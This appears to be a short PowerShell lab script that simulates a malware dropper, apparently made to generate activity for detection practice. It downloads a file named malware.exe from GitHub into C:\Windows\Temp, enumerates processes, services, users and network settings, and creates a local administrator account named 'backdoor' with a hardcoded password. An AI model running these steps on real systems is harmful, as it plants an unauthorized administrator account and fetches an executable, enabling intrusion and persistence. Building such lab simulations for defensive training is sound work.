
# 0. Download a harmless test file in your isolated lab
Invoke-WebRequest -Uri "https://github.com/s-anjeev/soc-projects/blob/main/03-Malware-Analysis/case-01-powershell-dropper/sample/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"

# 1. Enumerate running processes
Get-Process

# 2. Enumerate services
Get-Service

# 3. Check the current PowerShell execution policy
Get-ExecutionPolicy

# 4. Enumerate local users
Get-LocalUser

# 5. Check system/network configuration
Get-NetIPConfiguration

# 6. Creates the local user backdoor, Adds backdoor to the local Administrators group
New-LocalUser -Name "backdoor" -Password (ConvertTo-SecureString 'P@ssword123df23!DC48i' -AsPlainText -Force); Add-LocalGroupMember -Group "Administrators" -Member "backdoor"

# 7. List all members of Administrator Group
Get-LocalGroupMember -Group "Administrators"

